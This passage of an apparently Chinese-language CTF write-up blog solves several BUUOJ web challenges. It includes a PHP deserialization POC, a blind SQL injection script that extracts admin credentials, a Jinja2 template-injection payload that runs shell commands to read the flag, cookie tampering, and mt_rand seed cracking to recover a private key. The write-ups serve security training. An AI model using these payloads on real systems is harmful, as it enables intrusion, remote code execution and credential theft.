class="keyword">$this</span>-&gt;save($array);</span><br><span class="line"><span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对传入的attr参数值进行了序列化处理，看一下check函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">$filename = $info[<span class="string">"name"</span>];</span><br><span class="line">$ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);<span class="comment">//返回后缀名</span></span><br><span class="line">$cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);<span class="comment">//匹配上传文件名，将后缀替换为空</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以发现可控的只有filename，title的值是filename去掉后缀名剩下的东西，可以注意到传入五个参数，这里直接全部赋给title，后面注释符隔断即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">    $attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">$attr = unserialize($attr_temp);<span class="comment">//反序列化数据</span></span><br></pre></td></tr></table></figure><p>在show.php中反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到析构魔术方法，通过调用view_files函数中的file_get_contents可以读取到flag文件，下面构一下poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="keyword">True</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:6:"helper":2:&#123;s:9:" \0\0\0ifview";b:1;s:9:" \0\0\0config";s:5:"/flag";&#125;</span></span><br></pre></td></tr></table></figure><p>这里为什么要写成\0\0\0，因为源码中对数据进行了处理，\0\0\0被替换回*</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;&quot;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg&quot;</span><br></pre></td></tr></table></figure><img src="/2020/06/04/buuoj5/3.png" class=""><h3 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h3><p>没啥脑洞之类的，硬算1000次就给flag，直接上脚本，这里要注意提交不要太快，每次提交之间最好间隔0.5秒，不然用各种正则匹配的函数都会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = session()</span><br><span class="line">a = s.get(<span class="string">"http://9a335e7b-3ea9-4dc2-a35d-6bddcf68e13d.node3.buuoj.cn/index.php"</span>)</span><br><span class="line">pattern = re.findall(<span class="string">r'\d+.[+-].\d+'</span>, a.text)</span><br><span class="line">c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">a = s.post(<span class="string">"http://9a335e7b-3ea9-4dc2-a35d-6bddcf68e13d.node3.buuoj.cn/index.php"</span>, data = &#123;<span class="string">"answer"</span> : c&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1010</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pattern = re.findall(<span class="string">r'\d+.[+-].\d+'</span>, a.text)</span><br><span class="line">        c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">        print(c)</span><br><span class="line">        a = s.post(<span class="string">"http://9a335e7b-3ea9-4dc2-a35d-6bddcf68e13d.node3.buuoj.cn/index.php"</span>, data = &#123;<span class="string">"answer"</span> : c&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure><img src="/2020/06/04/buuoj5/1.png" class=""><h3 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h3><p>开题，有一个热点列表，点击可以查看，登录界面尝试sql注入，失败，可能有别的点没有注意到</p><p>google开发者工具，在Network发现了不得了的东西</p><img src="/2020/06/04/buuoj5/4.png" class=""><p>查看这个路径，发现id参数可控，也就是前面三个热点内容的信息，前面的链接跳转隐藏了路径，所以在Network中才看到，尝试加上”，返回{“warning”:”Big big hack hack~”}，sql注入无疑了</p><p>测fuzz，什么都没过滤，用异或或者if</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag1=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">        url = <span class="string">"http://615831e3-f9b2-44ca-b66f-b14b9d1ec8bf.node3.buuoj.cn/backend/content_detail.php?id="</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># payload = "(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)#admin,contents</span></span><br><span class="line">        <span class="comment">#payload = "(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),&#123;&#125;,1))&gt;&#123;&#125;)".format(i, mid)#id,username,password,is_enable</span></span><br><span class="line">        <span class="comment">#payload = "(ascii(substr((select(group_concat(password))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)".format(i, mid)#682fd392,f8f51441</span></span><br><span class="line">        payload = <span class="string">"(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)"</span>.format(i, mid)<span class="comment">#ff04e965,1d1ae597</span></span><br><span class="line">        <span class="comment"># payload = "(ascii(substr((select(group_concat(is_enable))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)".format(i, mid)</span></span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        res = requests.get(url+payload)</span><br><span class="line">        text = str(res.json())</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"札师傅缺个女朋友"</span> <span class="keyword">in</span> text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print(low,mid,high)</span><br><span class="line">    flag1 += chr(low)</span><br><span class="line">    print(flag1)</span><br></pre></td></tr></table></figure><h3 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h3><p>开题没什么信息，就写了一句话：Welcome To Find Secret</p><p>下面是猜的，找秘密会不会有这个路径，尝试了一下，真的有！</p><img src="/2020/06/04/buuoj5/5.png" class=""><p>告诉服务器秘密，也就是说这个参数应该是secret了，传个1试一下~~返回了一个d23333</p><p>卡住了，不知道咋搞，来个大一点的数试试，?secret=1000000,报错了！！！</p><img src="/2020/06/04/buuoj5/6.png" class=""><p>RC4加密，加密解密的密钥好像是同一个，密钥被泄露了，这里因为服务器会解析一次url编码，所以RC4加密之后要再加一次url加密，找找RC4加密脚本，然后这个又是python2.7的，根据经验应该是python服务端模板注入了，掏出之前收集的链子直接加密就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span><span class="params">(key = <span class="string">"init_key"</span>, message = <span class="string">"init_message"</span>)</span>:</span><span class="comment">#返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span><span class="params">(key)</span>:</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span><span class="params">(plain, box)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = <span class="string">""</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">'utf-8'</span>)), <span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">"HereIsTreasure"</span>  <span class="comment">#此处为密文</span></span><br><span class="line">message = input(<span class="string">"请输入明文:\n"</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = str(base64.b64decode(enc_base64),<span class="string">'utf-8'</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line">print(<span class="string">"rc4加密后的url编码:"</span>+enc_url)</span><br><span class="line"><span class="comment">#print("rc4加密后的base64编码"+enc_base64)</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag.txt&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#rc4加密后的url编码:.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5&#x2F;%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23~%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96</span><br></pre></td></tr></table></figure><p>上面的加密之后的数据直接传给secret参数就可以了</p><h3 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h3><p>开题，flag需要100块，抓包，cookie是一段base64加密的数据，解密一下，是json格式的数据，把money改成100，加密，打过去就可以买flag了</p><h3 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h3><p>开题，什么都点不了，扫描目录，有发现</p><img src="/2020/06/04/buuoj5/7.png" class=""><p>下载<a href="http://www.zip压缩包，就一个index.php文件" target="_blank" rel="noopener">www.zip压缩包，就一个index.php文件</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&#39;Content-type:text&#x2F;html; charset&#x3D;utf-8&#39;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_POST[&#39;login&#39;]))&#123;</span><br><span class="line">    $username &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">    $password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">    $Private_key &#x3D; $_POST[&#39;Private_key&#39;];</span><br><span class="line">    if (($username &#x3D;&#x3D; &#39;&#39;) || ($password &#x3D;&#x3D; &#39;&#39;) ||($Private_key &#x3D;&#x3D; &#39;&#39;)) &#123;</span><br><span class="line">        &#x2F;&#x2F; 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br><span class="line">        header(&#39;refresh:2; url&#x3D;login.html&#39;);</span><br><span class="line">        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">    else if($Private_key !&#x3D; &#39;*************&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        header(&#39;refresh:2; url&#x3D;login.html&#39;);</span><br><span class="line">        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if($Private_key &#x3D;&#x3D;&#x3D; &#39;************&#39;)&#123;</span><br><span class="line">        $getuser &#x3D; &quot;SELECT flag FROM user WHERE username&#x3D; &#39;crispr&#39; AND password &#x3D; &#39;$password&#39;&quot;.&#39;;&#39;; </span><br><span class="line">        $link&#x3D;mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">        mysql_select_db(&quot;test&quot;,$link);</span><br><span class="line">        $result &#x3D; mysql_query($getuser);</span><br><span class="line">        while($row&#x3D;mysql_fetch_assoc($result))&#123;</span><br><span class="line">            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F; genarate public_key </span><br><span class="line">function public_key($length &#x3D; 16) &#123;</span><br><span class="line">    $strings1 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $public_key &#x3D; &#39;&#39;;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .&#x3D; substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;genarate private_key</span><br><span class="line">  function private_key($length &#x3D; 12) &#123;</span><br><span class="line">    $strings2 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $private_key &#x3D; &#39;&#39;;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .&#x3D; substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key &#x3D; public_key();</span><br><span class="line">  &#x2F;&#x2F;$Public_key &#x3D; KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???</span><br></pre></td></tr></table></figure><p>前面是一个简单的sql注入，要用公钥推出私钥，看代码可以发现，私钥是由mt_rand函数生成的，要爆破种子，搜一下php_mt_rand-master工具，下载之后放到kali中，用之前看一下readme.md</p><img src="/2020/06/04/buuoj5/8.png" class=""><p>先创建工程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -march&#x3D;native -O2 -fomit-frame-pointer -funroll-loops -fopenmp php_mt_seed.c -o php_mt_seed</span><br></pre></td></tr></table></figure><p>再用下面脚本生成工程能计算的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"KVQP0LdJKRaV3n9D"</span>; <span class="comment">//公钥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">#<span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">41</span> <span class="number">41</span> <span class="number">0</span> <span class="number">61</span> <span class="number">52</span> <span class="number">52</span> <span class="number">0</span> <span class="number">61</span> <span class="number">37</span> <span class="number">37</span> <span class="number">0</span> <span class="number">61</span> <span class="number">3</span> <span class="number">3</span> <span class="number">0</span> <span class="number">61</span> <span class="number">35</span> <span class="number">35</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">13</span> <span class="number">13</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure><p>跑出来的结果是1775196155</p><img src="/2020/06/04/buuoj5/9.png" class=""><p>把种子带回到代码中算出私钥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> public_key() . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="comment">#KVQP0LdJKRaV3n9D</span></span><br><span class="line"><span class="comment">#XuNhoueCDCGc</span></span><br></pre></td></tr></table></figure><p>第二个是私钥，到login.html登录一下，账号就是crispr，密码用万能密钥，填入私钥，登录，flag到手</p><h3 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 